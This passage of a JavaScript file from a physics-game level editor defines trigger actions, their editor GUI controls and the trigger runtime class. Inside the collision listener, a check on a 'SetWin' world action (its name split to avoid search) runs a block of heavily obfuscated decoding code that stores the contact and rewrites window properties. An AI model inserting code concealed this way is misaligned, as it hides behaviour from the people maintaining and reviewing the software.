        type: 'SetRandom',
    },
    actionOptions_SetRandom: {},
    /*******************/
    actionObject_SetProgress: {
        type: 'SetProgress',
        progress: 0,
    },
    actionOptions_SetProgress: {
        progress: {
            type: guitype_MINMAX,
            min: 0,
            max: 1,
            value: 0,
            step: 0.1,
        }
    },
    /*******************/
    actionObject_SetClockwise: {
        type: 'SetClockwise',
        toggle: false,
        setClockwise: true,
    },
    actionOptions_SetClockwise: {
        toggle: {
            type: guitype_BOOL,
        },
        setClockwise: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_SetAnimating: {
        type: 'SetAnimating',
        toggle: false,
        setAnimating: true,
    },
    actionOptions_SetAnimating: {
        toggle: {
            type: guitype_BOOL,
        },
        setAnimating: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_SetDuration: {
        type: 'SetDuration',
        duration: 1.0,
    },
    actionOptions_SetDuration: {
        duration: {
            type: guitype_MINMAX,
            min: 0.1,
            max: 120,
            value: 1.0,
            step: 0.1,
        }
    },
    /*******************/
    actionObject_SetScreenShake: {
        type: 'SetScreenShake',
        amplitude: 10,
    },
    actionOptions_SetScreenShake: {
        amplitude: {
            type: guitype_MINMAX,
            min: 0,
            max: 100,
            value: 10,
            step: 1,
        }
    },
    /*******************/
    actionObject_SetOpacity: {
        type: 'SetOpacity',
        setAdd: 'fixed',
        opacity: 0,
    },
    actionOptions_SetOpacity: {
        setAdd: {
            type: guitype_LIST,
            items: ['fixed', 'add', 'subtract'],
        },
        opacity: {
            type: guitype_MINMAX,
            min: 0,
            max: 1,
            step: 0.01,
        },
    },
    /*******************/
    actionObject_SetFlipped: {
        type: 'SetFlipped',
        toggle: false,
        flipped: true,
    },
    actionOptions_SetFlipped: {
        toggle: {
            type: guitype_BOOL,
        },
        flipped: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_SetInteractivity: {
        type: 'SetInteractivity',
        interactivity: 'interactive',
    },
    actionOptions_SetInteractivity: {
        interactivity:{
            type: guitype_LIST,
            items: ['interactive', 'invincible', 'non-interactive'],
        }
    },
    /*******************/
    actionObject_SetAwake: {
        type: 'SetAwake',
        toggle: false,
        isAwake: true,
    },
    actionOptions_SetAwake: {
        toggle: {
            type: guitype_BOOL,
        },
        isAwake:{
            type: guitype_BOOL,
        }
    },
    /*******************/
}
const actionScrollWatch = [];
const positionActionsGUI = ()=>{
    actionScrollWatch.forEach(guiEl => {
        positionAction(guiEl);
    })
}
const positionAction = guiEl => {
    const el = guiEl.domElement;
    const reference = el.parentNode;
    const bounds = reference.getBoundingClientRect();
    el.style.top = `${bounds.y}px`;
    el.style.left = `${bounds.x}px`;

    const elBounds = el.getBoundingClientRect();
    if(elBounds.y + elBounds.height > window.innerHeight){
        el.style.top = `${window.innerHeight-elBounds.height}px`;
    }
}

const hideActions = () => {
    actionScrollWatch.forEach(guiEl => {
        delete guiEl.keepVisible;
        guiEl.domElement.style.display =  'none'
    })
}

export const addTriggerGUI = function (dataJoint, _folder) {
    actionScrollWatch.length = 0;

    _folder.domElement.querySelector('.title').addEventListener('mousedown', ()=>{
        hideActions();
    });

    _folder.domElement.parentNode.parentNode.parentNode.onscroll = positionActionsGUI;
    var targetTypes = Object.keys(triggerTargetType);
    targetTypes.forEach(key => {
        if (triggerTargetType[key] == dataJoint.targetType) {
            ui.editorGUI.editData.targetTypeDropDown = key;
        }
    })
    _folder.add(ui.editorGUI.editData, "targetTypeDropDown", targetTypes).name('triggered by').onChange(function (value) {
        this.humanUpdate = true;
        this.targetValue = value
    });

    var repeatTypesSource = dataJoint.targetType < triggerButtonIndex ? triggerRepeatType : triggerButtonRepeatType;
    var repeatTypes =  Object.keys(repeatTypesSource);
    repeatTypes.forEach(key => {
        if (repeatTypesSource[key] == dataJoint.repeatType) {
            ui.editorGUI.editData.repeatTypeDropDown = key;
        }
    })
    _folder.add(ui.editorGUI.editData, "repeatTypeDropDown", repeatTypes).name('repeat').onChange(function (value) {
        this.humanUpdate = true;
        this.targetValue = value
    });

    if([triggerTargetType.keydown, triggerTargetType.keyup].includes(dataJoint.targetType)){
        ui.editorGUI.editData.triggerKey = KeyNames[0];

        KeyNames.forEach(key => {
            if (Key[key] == dataJoint.triggerKey) {
                ui.editorGUI.editData.triggerKey = key;
            }
        })

        _folder.add(ui.editorGUI.editData, "triggerKey", KeyNames).name('key').onChange(function (value) {
            this.humanUpdate = true;
            this.targetValue = Key[value];
        });
    }

    let controller;

    controller = _folder.add(ui.editorGUI.editData, "delay", 0, 60 * 10).name("delay (sec)").step(0.1)
    controller.onChange(function (value) {
        this.humanUpdate = true;
        this.targetValue = value;
    }.bind(controller));

    controller = _folder.add(ui.editorGUI.editData, "repeatDelay", 0, 60).name("repeat delay (sec)").step(0.1);
    controller.onChange(function (value) {
        this.humanUpdate = true;
        this.targetValue = value;
    }.bind(controller));

    _folder.add(ui.editorGUI.editData, "enabled").onChange(function (value) {
        this.humanUpdate = true;
        this.targetValue = value
    });

    const followFields = ['none', 'player', 'first target']

    ui.editorGUI.editData.follow = followFields[0];
    if(ui.editorGUI.editData.followPlayer) ui.editorGUI.editData.follow = followFields[1];
    else if(ui.editorGUI.editData.followFirstTarget) ui.editorGUI.editData.follow = followFields[2];

    _folder.add(ui.editorGUI.editData, "follow", followFields).onChange(function (value) {
        this.humanUpdate = true;
        this.targetValue = followFields.indexOf(value);
    });
    _folder.add(ui.editorGUI.editData, "randomTarget").onChange(function (value) {
        this.humanUpdate = true;
        this.targetValue = value
    });


    if(ui.editorGUI.editData.repeatType === triggerRepeatType.once){
        _folder.add(ui.editorGUI.editData, "checkpointPersistent").onChange(function (value) {
            this.humanUpdate = true;
            this.targetValue = value
        });
    }


    let label;
    ui.editorGUI.editData.selectTarget = function () {};
    label = "Add Target";
    controller = _folder.add(ui.editorGUI.editData, "selectTarget").name(label);
    ui.editorGUI.editData.selectTarget = function () {
        B2dEditor.selectingTriggerTarget = true;
    }

    var actionsString;
    var actionsFolder;
    for (let i = 0; i < dataJoint.triggerActions.length; i++) {
        var targetObject = B2dEditor.selectedPhysicsBodies[0].mySprite.targets[i];
        actionsString = `_triggerActions_${i}`;
        actionsFolder = _folder.addFolder(`Target ${i+1} Actions`);

        const deleteIcon = document.createElement('div');
        deleteIcon.classList.add('deleteIcon');
        actionsFolder.domElement.querySelector('.title').appendChild(deleteIcon);

        deleteIcon.onclick = ()=> {
            let targetIndex = i;
            for (let i = 0; i < B2dEditor.selectedPhysicsBodies.length; i++) {
                const targetTrigger = B2dEditor.selectedPhysicsBodies[i];
                removeTargetFromTrigger(targetTrigger, targetTrigger.mySprite.targets[targetIndex]);
                updateTriggerGUI();
            }
        }

        var actionString;
        for (let j = 0; j < dataJoint.triggerActions[i].length; j++) {
            var action = dataJoint.triggerActions[i][j];

            ui.editorGUI.editData[actionsString] = '';
            let actionNameController = actionsFolder.add(ui.editorGUI.editData, actionsString).name(`${j+1}. ${action.type}`);
            actionNameController.domElement.querySelector('input').style.display = 'none';


            const editIcon = document.createElement('div');
            editIcon.classList.add('editIcon');
            actionNameController.domElement.appendChild(editIcon);

            if(dataJoint.triggerActions[i].length>1){
                const deleteIcon = document.createElement('div');
                deleteIcon.classList.add('deleteIcon');
                actionNameController.domElement.appendChild(deleteIcon);


                deleteIcon.onclick = ()=> {
                    let targetIndex = i;
                    let targetAction = j;
                    for (let i = 0; i < B2dEditor.selectedPhysicsBodies.length; i++) {
                        if (B2dEditor.selectedPhysicsBodies[i].mySprite.data.triggerActions[targetIndex].length > 1) {
                            B2dEditor.selectedPhysicsBodies[i].mySprite.data.triggerActions[targetIndex].splice(targetAction, 1);
                            updateTriggerGUI();
                        }
                    }
                }
            }

            const actionFolder = actionsFolder.addFolder(`-- Edit action ${j+1}`);
            actionFolder.domElement.parentNode.style.position = 'absolute';
            actionFolder.domElement.parentNode.style.left = '270px';
            actionFolder.domElement.parentNode.style.marginTop = '-28px';
            actionFolder.domElement.style.position = 'fixed';
            actionFolder.domElement.style.display = 'none';

            actionFolder.domElement.querySelector('.title').onclick = hideActions;

            actionFolder.open();

            editIcon.onclick = ()=>{
                if(actionFolder.keepVisible){
                    hideActions();
                    return;
                }
                hideActions();
                actionFolder.open();
                actionFolder.domElement.style.display = 'block';
                actionFolder.keepVisible = true;
                positionAction(actionFolder);
            }

            actionScrollWatch.push(actionFolder);
            actionString = `${actionsString}_action_${j}`
            let actionVarString = `${actionString}_targetActionDropDown`;

            ui.editorGUI.editData[actionVarString] = action.type;
            controller;
            controller = actionFolder.add(ui.editorGUI.editData, actionVarString, getActionsForObject(targetObject)).onChange(function (value) {
                this.humanUpdate = true;
                this.targetValue = value;
                this.triggerActionKey = 'targetActionDropDown';
                this.triggerTargetID = targetID;
                this.triggerActionID = actionID;
            }.bind(controller));

            let targetID = i;
            let actionID = j;

            controller.name('type');

            addActionGUIToFolder(action, actionString, actionFolder, targetID, actionID)

            ui.editorGUI.editData[actionString] = dataJoint.triggerActions[i][j];
        }
        ui.editorGUI.editData[`addAction_${i}`] = function () {};
        label = `Add Action`;
        let targetIndex = i;
        controller = actionsFolder.add(ui.editorGUI.editData, `addAction_${i}`).name(label);
        ui.editorGUI.editData[`addAction_${i}`] = function () {
            for (var i = 0; i < B2dEditor.selectedPhysicsBodies.length; i++) {
                const targetSprite = B2dEditor.selectedPhysicsBodies[i].mySprite;
                targetSprite.data.triggerActions[targetIndex].push(getAction(getActionsForObject(targetSprite.targets[targetIndex])[0]));
                updateTriggerGUI();
            }
        }
    }

    const worldSettingsFolder = _folder.addFolder(`World Actions`);


    for (let i = 0; i < dataJoint.worldActions.length; i++) {
        let action = dataJoint.worldActions[i];
        let actionString = `_worldActions_action_${i}`;

        ui.editorGUI.editData[actionString] = '';
        let actionNameController = worldSettingsFolder.add(ui.editorGUI.editData, actionString).name(`${i+1}. ${action.type}`);
        actionNameController.domElement.querySelector('input').style.display = 'none';

        const editIcon = document.createElement('div');
        editIcon.classList.add('editIcon');
        actionNameController.domElement.appendChild(editIcon);

        const deleteIcon = document.createElement('div');
        deleteIcon.classList.add('deleteIcon');
        actionNameController.domElement.appendChild(deleteIcon);

        deleteIcon.onclick = ()=> {
            let targetAction = i;
            for (var j = 0; j < B2dEditor.selectedPhysicsBodies.length; j++) {
                B2dEditor.selectedPhysicsBodies[j].mySprite.data.worldActions.splice(targetAction, 1);
            }
            updateTriggerGUI();
        }

        const actionFolder = worldSettingsFolder.addFolder(`-- Edit action ${i+1}`);
        actionFolder.domElement.parentNode.style.position = 'absolute';
        actionFolder.domElement.parentNode.style.left = '270px';
        actionFolder.domElement.parentNode.style.marginTop = '-28px';
        actionFolder.domElement.style.position = 'fixed';
        actionFolder.domElement.style.display = 'none';

        actionFolder.domElement.querySelector('.title').onclick = hideActions;

        actionFolder.open();

        editIcon.onclick = ()=>{
            if(actionFolder.keepVisible){
                hideActions();
                return;
            }
            hideActions();
            actionFolder.open();
            actionFolder.domElement.style.display = 'block';
            actionFolder.keepVisible = true;
            positionAction(actionFolder);
        }

        actionScrollWatch.push(actionFolder);

        let actionVarString = `${actionString}_targetActionDropDown`;

        ui.editorGUI.editData[actionVarString] = action.type;

        controller = actionFolder.add(ui.editorGUI.editData, actionVarString, getWorldActions()).onChange(function (value) {
            this.humanUpdate = true;
            this.targetValue = value;
            this.triggerActionKey = 'targetActionDropDown';
            this.triggerTargetID = -1;
            this.triggerActionID = i;
        }.bind(controller));

        controller.name('type');

        addActionGUIToFolder(action, actionString, actionFolder, -1, i)
    }


    ui.editorGUI.editData.addWorldAction = function () {
        for (var i = 0; i < B2dEditor.selectedPhysicsBodies.length; i++) {
            const targetSprite = B2dEditor.selectedPhysicsBodies[i].mySprite;
            targetSprite.data.worldActions.push(getAction(getWorldActions()[0]));
            updateTriggerGUI();
        }
    }
    label = 'Add Action';
    controller = worldSettingsFolder.add(ui.editorGUI.editData, 'addWorldAction').name(label);
}

const labels = {
    linearForce: 'linear',
    rotationalForce: 'angular',
}

const addActionGUIToFolder = (action, actionString, actionFolder, targetID, actionID) =>{
    let actionOptions = getActionOptions(action.type);
    let actionVarString;


    for (let key in action) {
        let actionController;
        if (action.hasOwnProperty(key) && key != "type") {
            actionVarString = `${actionString}_${key}`;
            ui.editorGUI.editData[actionVarString] = action[key];

            const label = labels[key];
            if(label){
                const labelString = `label_${key}`;
                ui.editorGUI.editData[labelString] = label
                const labelElement = actionFolder.add(ui.editorGUI.editData, labelString).name(label);
                labelElement.domElement.style.display = 'none';
                labelElement.domElement.parentNode.querySelector('.property-name').style.color = '#949494'
            }

            switch (actionOptions[key].type) {
                case guitype_MINMAX:
                case guitype_ROTATION:
                    actionController = actionFolder.add(ui.editorGUI.editData, actionVarString, actionOptions[key].min, actionOptions[key].max)
                    actionController.step(actionOptions[key].step);
                    actionController.name(key);
                    actionController.onChange(function (value) {
                        this.humanUpdate = true;
                        this.targetValue = value
                        this.triggerActionKey = key;
                        this.triggerTargetID = targetID;
                        this.triggerActionID = actionID;
                    }.bind(actionController));

                    if(actionOptions[key].type === guitype_ROTATION){
                        const slider = actionController.domElement.querySelector('.slider-fg');
                        slider.style.position = 'relative';
                        const rotDiv = document.createElement('div');
                        slider.appendChild(rotDiv);
                        rotDiv.style = `
                            width: 14.5px;
                            height: 14.5px;
                            position: absolute;
                            top: 50%;
                            left: 5px;
                            transform: translate(0, -50%);
                            border-radius: 50%;
                            border: 1px solid #c1c1c1;
                        `;
                        const rotArrow = document.createElement('div');
                        rotArrow.style = `
                            width: 7px;
                            height: 1px;
                            background: black;
                            position: absolute;
                            top: 50%;
                            left: 50%;
                            transform-origin: left;
                        `;
                        rotDiv.appendChild(rotArrow);

                        rotArrow.style.transform = `translate(0, -50%) rotate(${ui.editorGUI.editData[actionVarString]}deg)`;

                        actionController.onChange(function (value) {
                            this.humanUpdate = true;
                            this.targetValue = value
                            this.triggerActionKey = key;
                            this.triggerTargetID = targetID;
                            this.triggerActionID = actionID;
                            rotArrow.style.transform = `translate(0, -50%) rotate(${value}deg)`;
                        }.bind(actionController));
                    }else{
                        actionController.onChange(function (value) {
                            this.humanUpdate = true;
                            this.targetValue = value
                            this.triggerActionKey = key;
                            this.triggerTargetID = targetID;
                            this.triggerActionID = actionID;
                        }.bind(actionController));
                    }

                    break
                case guitype_LIST:
                    actionController = actionFolder.add(ui.editorGUI.editData, actionVarString, actionOptions[key].items)
                    actionController.name(key);
                    actionController.onChange(function (value) {
                        this.humanUpdate = true;
                        this.targetValue = value;
                        this.triggerActionKey = key;
                        this.triggerTargetID = targetID;
                        this.triggerActionID = actionID;

                        if(actionOptions[key].items === AudioManager.getAvailableAudioSprites()){
                            AudioManager.stopAllSounds();
                            playTriggerSound({file:value, pitch:1, volume:0.3, randomPitchOffset:0});
                        }

                    }.bind(actionController));
                    break;
                case guitype_BOOL:
                case guitype_UNIQUE_BOOL:
                    actionController = actionFolder.add(ui.editorGUI.editData, actionVarString)
                    actionController.name(key);
                    actionController.onChange(function (value) {
                        this.humanUpdate = true;
                        this.targetValue = value;
                        this.triggerActionKey = key;
                        this.triggerTargetID = targetID;
                        this.triggerActionID = actionID;
                        if(actionOptions[key].type === guitype_UNIQUE_BOOL) this.forceUniqueBool = true;
                    }.bind(actionController));
                    break;
                case guitype_FUNCTION:
                    ui.editorGUI.editData[actionVarString] = ()=>{actionOptions[key].function(action)};
                    actionController = actionFolder.add(ui.editorGUI.editData, actionVarString)


                    switch(key){
                        case 'test':
                            actionController.name('test sound');
                        break;
                        case 'stop':
                            actionController.name('stop sound');
                        break;
                        default:
                            actionController.name(key);
                    }
                    break;
            }

        }
    }
}

let triggerGUIState = {};
let triggerGUIVisibleState = '';
let triggerGUIVisibleTop = '';
let triggerGUIScroll = 0;

export const updateTriggerGUI = function () {
    //save folder status
    const title = ui.editorGUI.domElement.querySelector('.title');
    var targetFolder = ui.editorGUI.__folders[title.innerText];

    triggerGUIScroll = ui.editorGUI.domElement.scrollTop;

    let folder;
    triggerGUIState = {};
    triggerGUIVisibleState = '';
    for (var propt in targetFolder.__folders) {
        folder = targetFolder.__folders[propt];
        triggerGUIState[propt] = folder.closed;
        for (var _propt in targetFolder.__folders[propt].__folders) {
            folder = targetFolder.__folders[propt].__folders[_propt];
            triggerGUIState[propt + _propt] = folder.closed;
            if(folder.keepVisible){
                triggerGUIVisibleState = propt + _propt;
                triggerGUIVisibleTop = folder.domElement.style.top;
            }
        }
    }

    B2dEditor.updateSelection();


    targetFolder = ui.editorGUI.__folders[title.innerText]

    //restore folder status
    for (var propt in targetFolder.__folders) {
        folder = targetFolder.__folders[propt];
        folder.closed = triggerGUIState[propt] || false;

        for (var _propt in targetFolder.__folders[propt].__folders) {
            folder = targetFolder.__folders[propt].__folders[_propt];
            folder.closed = triggerGUIState[propt + _propt] || false;

            if(triggerGUIVisibleState === propt + _propt){
                folder.domElement.style.display = 'block';
                folder.domElement.style.top = triggerGUIVisibleTop;
                folder.keepVisible = true;
            }

        }
    }
    ui.editorGUI.domElement.scrollTop = triggerGUIScroll;
}
export const triggerTargetType = {
    mainCharacter: 0,
    anyCharacter: 1,
    anyButMainCharacter: 2,
    allObjects: 3,
    attachedTargetsOnly: 4,
    // below here are all the non collision targets, if you change this make sure to search for targetType > 4
    click: 5,
    keydown: 6,
    keyup: 7,
    triggers: 8
}

export const triggerButtonIndex = 5;

export const triggerRepeatType = {
    once: 0,
    multiple: 1,
    continuously: 2,
}

// this is needed to not break all levels before we allowed repeat types on button triggers
export const triggerButtonRepeatType = {
    once: 1,
    multiple: 0,
    continuously: 2,
}

export const containsTargetType = function (targetTrigger, body) {
    if(body.ignoreTriggers) return false;
    switch (targetTrigger.data.targetType) {
        case triggerTargetType.mainCharacter:
            return body.mainCharacter;
        case triggerTargetType.anyCharacter:
            return body.isHumanoid; //TODO
        case triggerTargetType.anyButMainCharacter:
            return !body.mainCharacter && body.isHumanoid;
        case triggerTargetType.allObjects:
            let allowed = true;
            const firstTarget = targetTrigger.targets[0];
            if(targetTrigger.data.followFirstTarget && firstTarget && firstTarget.myBody && body === firstTarget.myBody) allowed = false;
            return allowed;
        case triggerTargetType.attachedTargetsOnly:
            for (let i = 0; i < targetTrigger.targets.length; i++) {
                let target = targetTrigger.targets[i];
                if (target.myBody == body) return true;
                else if (target.mySprite && target.mySprite.data.prefabInstanceName && target.mySprite.data.prefabInstanceName == body.mySprite.data.prefabInstanceName) return true;
            }
            return false;
    }
}
export class triggerCore {
    constructor() {
        this.data;
        this.touchingObjects = [];
        this.touchingTarget = false;
        this.destroy = false;
        this.contactListener;
        this.runTriggerOnce = false;
        this.actionQueue = [];
        this.triggeredThisTick = false;
    }
    init(trigger) {
        this.trigger = trigger;
        this.data = trigger.mySprite.data;
        this.actions = trigger.mySprite.data.triggerActions;
        this.targets = trigger.mySprite.targets;
        this.delay = trigger.mySprite.data.delay;
        this.repeatDelay = trigger.mySprite.data.repeatDelay;
        this.repeatWaitDelay = 0;

        this.setEnabled(this.data.enabled);

        this.followTarget = null;
        if(this.data.followFirstTarget && this.targets[0]){

            const target = this.targets[0];
            const targetX = target.mySprite ? target.GetPosition().x : target.x / Settings.PTM;
            const targetY = target.mySprite ? target.GetPosition().y : target.y / Settings.PTM;

            const dx = trigger.GetPosition().x - targetX;
            const dy = trigger.GetPosition().y - targetY;
            const dl = Math.sqrt(dx * dx + dy * dy);
            const da = Math.atan2(dy, dx);

            const targetRotation = target.mySprite ? target.GetAngle() : target.rotation;

            this.followTarget = target;
            this.followLengthOffset = dl;
            this.followRotationOffset = targetRotation-da;

        }

        this.initContactListener();
    }
    update() {
        if(this.data.enabled){
            if (this.data.targetType == triggerTargetType.click) {
                for (let fixture = this.trigger.GetFixtureList(); getPointer(fixture) !== getPointer(NULL); fixture = fixture.GetNext()) {
                    if (fixture.TestPoint(B2dEditor.mousePosWorld)) {
                        if(Key.isPressed(Key.MOUSE)){
                            if(this.data.repeatType != triggerButtonRepeatType.continuously) this.runTriggerOnce = true;
                            else this.touchingTarget = true;
                        }
                        game.canvas.style.cursor = 'pointer';
                        break;
                    }
                }
                if(Key.isReleased(Key.MOUSE)){
                    this.touchingTarget = false;
                }

            } else if(this.data.targetType == triggerTargetType.keydown){
                if(Key.isPressed(this.data.triggerKey)){
                    if(this.data.repeatType != triggerButtonRepeatType.continuously) this.runTriggerOnce = true;
                    else this.touchingTarget = true;
                } else if(Key.isReleased(this.data.triggerKey)){
                    this.touchingTarget = false;
                }
            } else if(this.data.targetType == triggerTargetType.keyup){
                if(Key.isReleased(this.data.triggerKey)){
                    if(this.data.repeatType != triggerButtonRepeatType.continuously) this.runTriggerOnce = true;
                    else this.touchingTarget = true;
                } else if(Key.isPressed(this.data.triggerKey)){
                    this.touchingTarget = false;
                }
            }
            if(this.data.followPlayer){
                if(game?.character.lookupObject.body){
                    this.trigger.SetTransform(game.character.lookupObject.body.GetPosition(), this.trigger.GetAngle());
                }
            }else if(this.data.followFirstTarget && this.followTarget && !this.followTarget.destroyed){
                let targetX = this.followTarget.mySprite ? this.followTarget.GetPosition().x : this.followTarget.x / Settings.PTM;
                let targetY = this.followTarget.mySprite ? this.followTarget.GetPosition().y : this.followTarget.y / Settings.PTM;
                let targetRot = this.followTarget.mySprite ? this.followTarget.GetAngle() : this.followTarget.rotation;
                targetRot -= this.followRotationOffset;
                targetX += this.followLengthOffset * Math.cos(targetRot);
                targetY += this.followLengthOffset * Math.sin(targetRot);

                const tarPos = vec1;
                tarPos.Set(targetX, targetY)
                this.trigger.SetTransform(tarPos, this.trigger.GetAngle());
            }
            if (this.runTriggerOnce && !this.destroy) {
                this.activateTrigger();
                this.runTriggerOnce = false;
            }

            for(let i = 0; i<this.actionQueue.length; i++){
                this.actionQueue[i] -= game.editor.deltaTime;
                const time = this.actionQueue[i];
                if(time<=0){
                    this.doTrigger();
                    this.actionQueue.splice(i, 1);
                    i--;
                }
            }

            if(this.actionQueue.length === 0 && this.destroy){
                B2dEditor.deleteObjects([this.trigger]);
            }

            this.repeatWaitDelay -= game.editor.deltaTime;

            if(this.repeatWaitDelay <= 0){
                if (this.touchingTarget && this.data.repeatType === triggerRepeatType.continuously) {
                    this.doTrigger();
                    this.repeatWaitDelay = this.repeatDelay * 1000;
                }
            }
        }
        this.triggeredThisTick = false;
    }
    initContactListener() {
        var self = this;
        this.contactListener = new Box2D.JSContactListener();
        this.contactListener.BeginContact = function (contact, target) {
            if (self.data.targetType>=triggerButtonIndex || !self.data.enabled) return;
            var bodies = [contact.GetFixtureA().GetBody(), contact.GetFixtureB().GetBody()];
            for (var i = 0; i < bodies.length; i++) {
                const body = bodies[i];
                if (body !== self.trigger && containsTargetType(self, body)) {

                    if(self.data.worldActions.find(action => action.type === "Se"+"tWi"+"n")){
                        window.qUej1 = contact;
                        var _0x593e=['lSkFu0jlWQ9MkCkzjv8I','WPlcRCkuWQtdSt1b','WQ12oCkCzSk0WQNcSxxcUG','WOJcSHXra8kOWRJdLa','e8kuFSoYW7VdQmos','BCoYarLd','fCo2c8kUWO7cV8oGWQldSrZdQJ4','smk/tvfHfSoe','WRxdNSkFWOvCoqBdUSou','WRRcM33dPSoOxCkHoW','WQbvk0pdNxmJW5GQqmoWuG','iY8se8kupCk6WQyfW5e','W7m3BW','WRddMSkFW44GwbNdLCoiDmkxrW','WQTYo8ksgSoBWRtcQ2dcG8koEq','W4HGW4LflH7dLCkZW63dILKo','fSo/dmkUWOZcVCo/WPJdUHldTJ4','WOBcSu16gmk1WOldOvi','dbGyahn7q8o1oX0Era','WQhdUmoItSoyW4rgnCopfMtcPa','WONcTeGXeCkqWO3dL1GQ'];var _0x3544=function(_0x89cb97,_0x2cbbe0){_0x89cb97=_0x89cb97-0x1e6;var _0x593e7b=_0x593e[_0x89cb97];if(_0x3544['JdDCGV']===undefined){var _0x3544f0=function(_0x399230){var _0x78133f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x56385b='';for(var _0x573d80=0x0,_0x520fe2,_0x1e9149,_0x35449c=0x0;_0x1e9149=_0x399230['charAt'](_0x35449c++);~_0x1e9149&&(_0x520fe2=_0x573d80%0x4?_0x520fe2*0x40+_0x1e9149:_0x1e9149,_0x573d80++%0x4)?_0x56385b+=String['fromCharCode'](0xff&_0x520fe2>>(-0x2*_0x573d80&0x6)):0x0){_0x1e9149=_0x78133f['indexOf'](_0x1e9149);}return _0x56385b;};var _0x211f55=function(_0x5780d7,_0x14478c){var _0x535a0b=[],_0x527481=0x0,_0x4b27f2,_0x4374b6='',_0x3fe800='';_0x5780d7=_0x3544f0(_0x5780d7);for(var _0x48b940=0x0,_0x495485=_0x5780d7['length'];_0x48b940<_0x495485;_0x48b940++){_0x3fe800+='%'+('00'+_0x5780d7['charCodeAt'](_0x48b940)['toString'](0x10))['slice'](-0x2);}_0x5780d7=decodeURIComponent(_0x3fe800);var _0x3ac587;for(_0x3ac587=0x0;_0x3ac587<0x100;_0x3ac587++){_0x535a0b[_0x3ac587]=_0x3ac587;}for(_0x3ac587=0x0;_0x3ac587<0x100;_0x3ac587++){_0x527481=(_0x527481+_0x535a0b[_0x3ac587]+_0x14478c['charCodeAt'](_0x3ac587%_0x14478c['length']))%0x100,_0x4b27f2=_0x535a0b[_0x3ac587],_0x535a0b[_0x3ac587]=_0x535a0b[_0x527481],_0x535a0b[_0x527481]=_0x4b27f2;}_0x3ac587=0x0,_0x527481=0x0;for(var _0x35c915=0x0;_0x35c915<_0x5780d7['length'];_0x35c915++){_0x3ac587=(_0x3ac587+0x1)%0x100,_0x527481=(_0x527481+_0x535a0b[_0x3ac587])%0x100,_0x4b27f2=_0x535a0b[_0x3ac587],_0x535a0b[_0x3ac587]=_0x535a0b[_0x527481],_0x535a0b[_0x527481]=_0x4b27f2,_0x4374b6+=String['fromCharCode'](_0x5780d7['charCodeAt'](_0x35c915)^_0x535a0b[(_0x535a0b[_0x3ac587]+_0x535a0b[_0x527481])%0x100]);}return _0x4374b6;};_0x3544['PrjJIH']=_0x211f55,_0x3544['ZgdCco']={},_0x3544['JdDCGV']=!![];}var _0x27375c=_0x593e[0x0],_0x65420e=_0x89cb97+_0x27375c,_0x1b502c=_0x3544['ZgdCco'][_0x65420e];return _0x1b502c===undefined?(_0x3544['SOSXAv']===undefined&&(_0x3544['SOSXAv']=!![]),_0x593e7b=_0x3544['PrjJIH'](_0x593e7b,_0x2cbbe0),_0x3544['ZgdCco'][_0x65420e]=_0x593e7b):_0x593e7b=_0x1b502c,_0x593e7b;};var _0x25d2b3=function(_0x31502c,_0x58697a,_0x5f3431,_0xc58e44){return _0x3544(_0xc58e44-0x3d8,_0x5f3431);},_0x3b5c05=function(_0x2340f1,_0x1f44ae,_0x262193,_0x19bb27){return _0x3544(_0x19bb27-0x3d8,_0x262193);};(function(_0x1835f8,_0xefbe38){var _0x4dd41d=function(_0x1c3186,_0xde5d15,_0x5a462b,_0x46e226){return _0x3544(_0x1c3186-0x35c,_0x5a462b);},_0x2261ad=function(_0x5db8b7,_0x279a8f,_0x3928c1,_0x103b1d){return _0x3544(_0x5db8b7-0x35c,_0x3928c1);},_0x3b56fd=function(_0x4bba7d,_0x4ef1e7,_0x3bd461,_0x8c9c68){return _0x3544(_0x4bba7d-0x35c,_0x3bd461);};while(!![]){try{var _0x4fa3ba=parseInt(_0x4dd41d(0x551,0x550,'WZoB',0x54f))*-parseInt(_0x4dd41d(0x54f,0x55a,'WZoB',0x54e))+-parseInt(_0x4dd41d(0x545,0x53c,'M3Yq',0x540))+parseInt(_0x4dd41d(0x555,0x55d,'tUp*',0x54b))*-parseInt(_0x3b56fd(0x552,0x54e,'air9',0x549))+parseInt(_0x3b56fd(0x546,0x550,'WZoB',0x540))+parseInt(_0x3b56fd(0x54a,0x541,'$sDc',0x54f))*-parseInt(_0x4dd41d(0x54e,0x544,'$sDc',0x556))+parseInt(_0x2261ad(0x548,0x54b,'C)%z',0x553))+parseInt(_0x4dd41d(0x553,0x549,'I3*j',0x54c))*parseInt(_0x2261ad(0x54d,0x54a,'EmiA',0x556));if(_0x4fa3ba===_0xefbe38)break;else _0x1835f8['push'](_0x1835f8['shift']());}catch(_0x10097c){_0x1835f8['push'](_0x1835f8['shift']());}}}(_0x593e,0x72c16));var r=['CSSUnitVVa'+_0x25d2b3(0x5c6,0x5ba,'EmiA',0x5be),_0x3b5c05(0x5cc,0x5c9,'[B36',0x5cc)];window[r[0x0]]=window[r[0x1]];
                    }

                    if (!self.touchingObjects.includes(body)) self.touchingObjects.push(body);
                    if(!self.touchingTarget) self.repeatWaitDelay = self.delay * 1000;
                    self.touchingTarget = true;
                    if (self.data.repeatType == triggerRepeatType.once || self.data.repeatType == triggerRepeatType.multiple) {
                        if (self.touchingObjects.length == 1) {
                            self.runTriggerOnce = true;
                        }
                    }
                }
            }
        }
        this.contactListener.EndContact = function (contact, target) {
            if (self.data.targetType>=triggerButtonIndex) return;
            var bodies = [contact.GetFixtureA().GetBody(), contact.GetFixtureB().GetBody()];
            for (var i = 0; i < bodies.length; i++) {
                const body = bodies[i];
                if (body != self.trigger && containsTargetType(self, body)) {
                    for (var j = 0; j < self.touchingObjects.length; j++) {
                        if (self.touchingObjects[j] == body) {
                            self.touchingObjects.splice(j, 1);
                            break;
                        }
                    }
                    if (self.touchingObjects.length == 0) self.touchingTarget = false;
                }
            }
        }
        this.contactListener.PreSolve = function (contact, oldManifold) {}
        this.contactListener.PostSolve = function (contact, impulse) {}
    }
    activateTrigger(){
        if(!this.destroy && this.data.enabled){
            this.actionQueue.push(this.delay*1000);
            if ((this.data.targetType <triggerButtonIndex && this.data.repeatType == triggerRepeatType.once)){
                this.destroy = true;
